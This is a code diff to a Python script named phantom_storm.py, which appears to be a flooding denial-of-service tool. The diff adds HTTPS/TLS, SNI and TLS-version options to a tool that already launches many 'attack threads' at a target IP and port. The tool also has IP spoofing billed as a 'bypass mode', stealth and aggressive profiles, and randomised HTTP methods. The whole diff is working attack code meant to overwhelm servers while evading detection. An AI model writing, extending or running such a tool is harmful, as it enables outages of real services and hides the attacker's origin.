@@ -39,6 +39,7 @@ from src import (
     config
 )
 from src.core import AttackProfiles, ProfileType
+from src.core.tls_handler import TLSConfig, TLSHelper
 
 # ============================================================================
 # BANNER & UI
@@ -162,14 +163,19 @@ def main():
         print(f"  python phantom_storm.py [Target_IP] [Port] [Threads] [Options]\n")
         print(f"{Colors.OKBLUE}Options:{Colors.ENDC}")
         print(f"  --profile=PROFILE  Use predefined profile (stealth, balanced, aggressive)")
+        print(f"  --https            Use HTTPS/TLS (default: HTTP)")
+        print(f"  --sni=HOSTNAME     SNI hostname for HTTPS")
+        print(f"  --verify-ssl       Verify SSL certificates (default: disabled)")
+        print(f"  --tls-version=VER  TLS version (TLS_1_0, TLS_1_1, TLS_1_2, TLS_1_3, AUTO)")
         print(f"  --no-spoof         Disable IP spoofing")
         print(f"  --method=METHOD    HTTP method (GET, POST, HEAD, OPTIONS, PUT, DELETE)")
         print(f"  --random-method    Use random HTTP method for each request\n")
         print(f"{Colors.OKBLUE}Examples:{Colors.ENDC}")
         print(f"  python phantom_storm.py 192.168.1.100 80 200")
+        print(f"  python phantom_storm.py 192.168.1.100 443 200 --https")
+        print(f"  python phantom_storm.py 192.168.1.100 443 200 --https --sni=www.example.com")
         print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=stealth")
-        print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=aggressive")
-        print(f"  python phantom_storm.py 192.168.1.100 80 200 --no-spoof --method=POST\n")
+        print(f"  python phantom_storm.py 192.168.1.100 443 200 --profile=aggressive --https\n")
         sys.exit(1)
     
     target_ip = sys.argv[1]
@@ -181,6 +187,12 @@ def main():
     use_spoofing = True
     http_method = HTTPMethod.GET
     randomize_method = False
+    
+    # TLS/HTTPS options
+    use_https = False
+    verify_ssl = False
+    tls_version = "AUTO"
+    sni_hostname = None
     
     for arg in sys.argv[4:]:
         if arg.startswith('--profile='):
@@ -212,6 +224,20 @@ def main():
         for arg in sys.argv[4:]:
             if arg == '--no-spoof':
                 use_spoofing = False
+            elif arg == '--https':
+                use_https = True
+            elif arg == '--verify-ssl':
+                verify_ssl = True
+            elif arg.startswith('--sni='):
+                sni_hostname = arg.split('=')[1]
+            elif arg.startswith('--tls-version='):
+                tls_version = arg.split('=')[1].upper()
+                # Validate TLS version
+                valid_versions = TLSHelper.get_available_tls_versions()
+                if tls_version not in valid_versions:
+                    print(f"{Colors.FAIL}[ERROR] Invalid TLS version: {tls_version}{Colors.ENDC}")
+                    print(f"Valid versions: {', '.join(valid_versions)}\n")
+                    sys.exit(1)
             elif arg.startswith('--method='):
                 method_name = arg.split('=')[1].upper()
                 try:
@@ -223,7 +249,24 @@ def main():
             elif arg == '--random-method':
                 randomize_method = True
     
+    # Create TLS config
+    tls_config = TLSConfig(
+        use_https=use_https,
+        verify_ssl=verify_ssl,
+        tls_version=tls_version,
+        sni_hostname=sni_hostname
+    )
+    
     # Display config
+    protocol = "HTTPS" if use_https else "HTTP"
+    print(f"\n{Colors.OKCYAN}[*] Protocol: {protocol}{Colors.ENDC}")
+    
+    if use_https:
+        print(f"{Colors.OKCYAN}[*] TLS Version: {tls_version}{Colors.ENDC}")
+        print(f"{Colors.OKCYAN}[*] SSL Verification: {'ENABLED' if verify_ssl else 'DISABLED'}{Colors.ENDC}")
+        if sni_hostname:
+            print(f"{Colors.OKCYAN}[*] SNI Hostname: {sni_hostname}{Colors.ENDC}")
+    
     if use_spoofing:
         print(f"{Colors.OKGREEN}[+] IP Spoofing ENABLED - Bypass mode active!{Colors.ENDC}")
     else:
@@ -260,6 +303,7 @@ def main():
     
     # Start attack
     print(f"\n{Colors.OKGREEN}[*] Launching attack on {target_ip}:{target_port}{Colors.ENDC}")
+    print(f"{Colors.OKGREEN}[*] Protocol: {protocol}{Colors.ENDC}")
     print(f"{Colors.OKGREEN}[*] Spawning {threads_count} attack threads...{Colors.ENDC}")
     if use_spoofing:
         print(f"{Colors.OKCYAN}[*] Each connection will use unique spoofed IP{Colors.ENDC}")
@@ -268,11 +312,16 @@ def main():
         print(f"{Colors.OKCYAN}[*] Using random HTTP methods for each request{Colors.ENDC}")
     else:
         print(f"{Colors.OKCYAN}[*] Using HTTP method: {http_method.value}{Colors.ENDC}")
+    if use_https:
+        print(f"{Colors.OKCYAN}[*] TLS/SSL enabled with {tls_version}{Colors.ENDC}")
     print(f"{Colors.OKGREEN}[*] Log file: logs/{log_filename}{Colors.ENDC}")
     print(f"{Colors.WARNING}[*] Press Ctrl+C to stop{Colors.ENDC}")
     
     logging.info(f"Spawning {threads_count} attack threads")
+    logging.info(f"Protocol: {protocol}")
     logging.info(f"HTTP Method: {'RANDOM' if randomize_method else http_method.value}")
+    if use_https:
+        logging.info(f"TLS Version: {tls_version}")
     
     # Create và start workers
     workers = []
@@ -284,7 +333,8 @@ def main():
             worker_id=i, 
             use_spoofing=use_spoofing,
             http_method=http_method,
-            randomize_method=randomize_method
+            randomize_method=randomize_method,
+            tls_config=tls_config
         )
         thread = threading.Thread(target=worker.run, daemon=True)
         thread.start()
